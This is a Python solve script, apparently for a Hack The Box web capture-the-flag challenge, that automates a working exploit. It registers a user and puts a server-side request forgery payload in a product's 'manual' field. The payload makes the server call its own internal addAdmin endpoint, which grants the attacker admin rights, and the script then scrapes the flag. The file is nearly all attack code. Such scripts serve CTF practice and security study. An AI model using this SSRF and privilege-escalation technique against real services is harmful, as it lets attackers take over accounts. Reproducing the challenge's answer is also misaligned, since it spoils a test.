#!/usr/bin/python3
import requests
import sys
import re

if len(sys.argv) != 2:
    print("Usage: python3 solve.py <URL>")
    exit(1)

USERNAME = 'test'
PASSWORD = 'test'
BASEURL = sys.argv[1]

if BASEURL[-1] != '/':
    BASEURL += '/'

s = requests.Session()

# Register user
print("Registering user...")
s.post(BASEURL + 'api/register',
       json={'username': USERNAME, 'password': PASSWORD})

# Login
print("Logging in...")
s.post(BASEURL + 'api/login',
       json={'username': USERNAME, 'password': PASSWORD})

# Sell product
print("Selling product...")
payload = f"http://0:1337/api/addAdmin?username={USERNAME}"
s.post(BASEURL + 'api/product',
       json={"name": "Name", "description": "Desc", "price": "10", "manual": payload})

s.cookies.clear()

# Login
print("Logging in...")
s.post(BASEURL + 'api/login',
       json={'username': USERNAME, 'password': PASSWORD})

print("Getting flag...")
r = s.get(BASEURL + 'home')

flag = re.search(r'HTB{.*}', r.text)
if flag:
    print("Flag found!", flag.group(0))
else:
    print("Flag not found!")
